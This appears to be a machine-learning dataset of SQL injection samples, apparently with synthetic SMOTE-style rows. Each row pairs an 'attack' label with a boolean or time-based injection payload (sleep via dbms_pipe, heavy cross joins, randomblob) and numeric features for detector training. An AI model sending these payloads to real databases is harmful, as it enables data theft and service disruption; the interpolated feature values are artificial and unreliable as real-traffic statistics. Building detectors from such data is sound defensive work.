id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,nearest_attack_euclidean,R000281,0.10071174362737233,137.0,26.486004924735024,3.2880399703367265,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000031,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.5294172483030257,115.27218680658486,29.141354089620542,4.1730408816359255,72.27218680658487,4.858645910379462,22.42406226886162,15.71729182075892,0.6267083178350557,0.042256789313245904,0.19443410276033074,0.13660079009136777,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.0,0.0,4.2932295518973,3.8586459103794595,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000032,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000124,2.2251454724797597,131.1134588279398,31.0,3.8172276129913736,52.022691765587965,12.696922354117284,49.04538353117593,17.348461177058642,0.3973670856975664,0.0963291818527463,0.37399038405535945,0.13231334839432782,0.6515388229413579,3.0,0.0,0.32576941147067895,0.0,0.0,0.0,10.348461177058642,0.0,0.674230588529321,2.348461177058642,0.32576941147067906,0.32576941147067895,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.32576941147067895,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.674230588529321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,boolean,"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000198,0.057922714402044925,153.6810570367368,35.94019819438815,4.322225521437002,75.8803963887763,16.980066064796052,42.880396388776305,17.940198194388152,0.4937803834500072,0.1105002919421262,0.2789994161157476,0.116719908492119,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.980066064796051,0.0,0.0,2.980066064796051,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.019933935203948705,0.9800660647960511,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000034,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000221,1.2926449969319407,68.49272352336189,20.33818431775874,3.1130061507903526,6.753638238319056,14.338184317758738,32.98544704672379,14.415453920560315,0.09970503694069077,0.21095046056361244,0.4787969794675162,0.21054752302818064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,4.830907841120631,1.9999999999999998,0.0,0.5845460794396844,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000054,0.4591351799390225,134.9142232572771,33.15237054287952,3.6752554046319945,36.15237054287952,15.847629457120485,56.60948217151806,26.304741085759026,0.2679907044501002,0.11753490272589082,0.41953486719487754,0.19493952562913144,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.152370542879515,0.15237054287951468,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.15237054287951468,0.8476294571204854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000036,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000078,0.25246613465666023,134.00413827659,28.908714702128183,4.018471798750883,65.09128529787182,10.0,36.73028238297455,22.182570595743638,0.4859477838679303,0.07466367049050229,0.2738606192031315,0.16552792643843586,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.182570595743638,1.9999999999999998,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0912852978718186,0.9087147021281814,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000037,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,1.057334975636721,131.5876051736233,29.0,3.43767255170309,43.665352254269756,13.0,60.17126711005585,14.750985809297683,0.33338084774798554,0.09903232474351878,0.45577358444893545,0.11181324305956027,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.583661936432561,0.0,9.167323872865122,0.0,0.0,0.0,1.583661936432561,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000038,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",nearest_attack_euclidean,R000291,0.6041695531311564,154.83372735860584,30.83372735860584,4.091294484188188,76.33018113115327,15.50354622745257,46.66745471721168,16.332545282788317,0.49303093939812814,0.10007860495009842,0.30139381212037436,0.10549664353139906,0.665090565576635,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.833727358605841,3.0,0.16627264139415876,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,0.8339579877374287,76.60702080490492,23.521404160980985,3.296971686793273,16.04280832196197,12.957191678038033,35.60702080490492,12.0,0.2087804996792537,0.17103905575236572,0.4630137319759864,0.15716671259239423,0.0,4.0,1.0,0.0,0.23929791950950802,1.2392979195095082,0.0,5.521404160980984,0.0,0.0,0.0,2.4785958390190164,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000261,0.897841819980807,86.5764039810656,20.493445550296,2.9413742595785246,10.890823770414393,13.0,45.5895128804736,17.0960673301776,0.123158421728007,0.15166080320889355,0.5274042000458905,0.19777657501720894,4.0,1.1102230246251565e-16,0.0,0.0,0.30131088994080035,2.0,0.0,7.397378220118399,1.9999999999999998,0.6986891100591996,0.6986891100591996,2.3013108899408,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,1.7669332798344295,145.51590094478638,33.82803301840455,3.957066614114875,54.31213207361818,12.34393396319091,53.29721226585001,25.562622642127273,0.37477309013671234,0.08430555047687929,0.36549412347057963,0.17542723591582876,3.3906556605318183,1.1102230246251565e-16,0.0,0.0,0.0,1.3906556605318183,0.0,10.781311321063637,0.0,2.0,1.0,7.390655660531818,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6093443394681816,0.0,0.0,0.6093443394681816,1.0,0.3906556605318184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6093443394681817
SMOTE_000042,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.4320691561213768,76.90974635118465,24.853096434524257,3.7446908504812213,24.41238573809703,13.0,28.05664991666039,11.440710696427226,0.3194220108451002,0.1695717117325151,0.3625144452452619,0.14849183217712286,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.146903565475742,0.0,4.293807130951484,0.0,1.0,1.0,1.1469035654757418,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000087,0.49901725759789894,126.97671900217892,31.0,3.4793182720481326,40.25910743106162,10.0,57.0,19.717611571117295,0.3165620064727215,0.07880198848352793,0.44917133435610923,0.15546467068764144,5.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,11.0,0.7176115711172969,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000113,0.0942169963797248,88.0,27.450379912196034,3.806695222196883,21.0,21.0,31.0,15.0,0.23863636363636365,0.23863636363636365,0.3522727272727273,0.17045454545454544,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000255,0.9284209833019437,142.80367449652678,32.601224832175596,4.152897019059553,73.20857382522917,16.0,38.595100671297615,15.0,0.5124584007632469,0.11205384200431301,0.27043728035339665,0.10505047687904345,0.0,0.6012248321755953,2.0,0.0,1.0,2.0,0.0,4.398775167824405,0.0,0.0,2.0,5.0,0.0,0.6012248321755953,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000046,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000236,0.16463882668170762,114.88705625185189,27.222588749629622,4.115483477124868,73.0,3.0,26.10964500148151,12.777411250370378,0.6356201377457915,0.02612137552379966,0.2270711635113276,0.11118732321908117,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.7774112503703776,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,2.0018799852260383,167.24302611819303,36.654184329084174,4.0349774944887935,61.61673731633671,21.588841789108862,61.48605223638607,22.55139477636139,0.36903668118633237,0.1287623680953828,0.36728506703268093,0.13491588368560392,4.0,2.2055791054455685,1.0,0.0,0.0,1.4486052236386078,0.0,8.897210447277216,0.0,0.0,0.0,6.448605223638609,1.0,0.551394776361392,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000048,attack,boolean,-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,0.8111080108743113,70.43630190605695,19.205185986579565,2.901407083605272,5.903889489934677,13.205185986579565,36.82074394631826,14.506482483224456,0.08312896753506538,0.18879675775900528,0.5213126278992669,0.20676164680666234,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,5.205185986579565,1.9999999999999998,0.0,0.3012964966448912,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000176,0.646070088360781,70.39058427527098,25.02146910322662,3.728316654010145,13.673823034408873,22.69529213763549,24.0,10.021469103226622,0.19446172848431065,0.321893003886383,0.34196543253814465,0.14167983509116172,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.673823034408873,0.0,0.6738230344088733,0.6738230344088734,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000035,0.8004432037456376,90.54725005050308,22.72637497474846,2.964173423341974,9.368125126257695,15.179124924245384,48.0,18.0,0.10323107016415073,0.16779773458623615,0.530160869272446,0.19881032597716725,4.0,1.1102230246251565e-16,0.7263749747484612,0.0,0.0,2.0,0.0,8.0,1.9999999999999998,0.27362502525153876,1.0,2.7263749747484614,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2736250252515386,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000058,0.28617776276016565,144.58514060042867,29.89228580831547,3.8611327274588287,48.0,16.0,54.15428383369057,26.430856766738113,0.3327640103164527,0.11092133677215091,0.37347195796545773,0.1828426949459387,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.430856766738113,0.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000052,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,1.8855753502988934,150.33711250743335,35.620298706127585,4.09392948154192,62.17671423259657,18.700497843545975,49.08019913741839,20.379701293872415,0.40692839512867657,0.1271167373981927,0.3300998881564793,0.13585497931665144,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,7.08019913741839,0.0,0.540099568709195,1.459900431290805,5.91980086258161,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.459900431290805,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000055,0.003934390039246776,160.96523069325275,32.00496704382104,4.051687671959421,74.0,18.0,47.970197737073775,20.995032956178964,0.4597311014237032,0.11182648413008997,0.2980104364924073,0.13043197795379952,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.995032956178963,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000054,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000152,0.04499497262901802,97.8636896697138,27.038945808653196,3.601087238611861,32.0,15.941581287020204,38.92210838269361,11.0,0.32701972758120185,0.16286789991170206,0.39769934115105793,0.11241303135603814,0.01947290432659865,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,6.980527095673401,0.0,1.0,1.0,2.0,0.01947290432659876,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000055,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",nearest_attack_euclidean,R000156,0.09457420278128982,153.69649984044656,31.12140006382137,4.051807380742481,86.0,8.060700031910685,42.63579980853589,17.0,0.5595790557710099,0.052461248417618456,0.27734523129849753,0.11061446451287404,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.878599936178631,0.0,0.0,2.0607000319106845,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000056,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,0.8302904268997643,76.61754459256608,23.523508918513215,3.296740776129161,16.047017837026438,12.952982162973568,35.617544592566084,12.0,0.20880868667243896,0.1709548808960042,0.46309288723082176,0.1571435452007351,0.0,4.0,1.0,0.0,0.23824554074339177,1.2382455407433919,0.0,5.523508918513216,0.0,0.0,0.0,2.4764910814867838,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,0.09555088214848431,77.14245681819455,28.736140559444475,3.9448173732532337,20.60421083916671,21.0,25.60421083916671,9.93403513986112,0.26669365922542765,0.2727827232382475,0.3316419266631056,0.1288816908732193,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.9340351398611184,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,0.9722010966356268,124.53838503554158,29.89877737216227,4.125229763518004,71.74083029121704,6.202445255675457,32.79755474432454,13.797554744324543,0.5748366083314798,0.051288414391699885,0.26365430486844554,0.11022067240837471,1.8987773721622718,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.449388686081136,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000059,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000034,1.3584005075699623,115.51611592709297,32.76280989093024,3.6094750102987447,31.61859505453488,15.0,50.660330763488325,18.23719010906976,0.27485971014725064,0.13054318978092158,0.4365072491200913,0.1580898509517365,3.0,1.1102230246251565e-16,2.0,1.0,0.0,1.0,0.0,9.855785163604642,0.3814049454651196,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6185950545348804,0.3814049454651196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
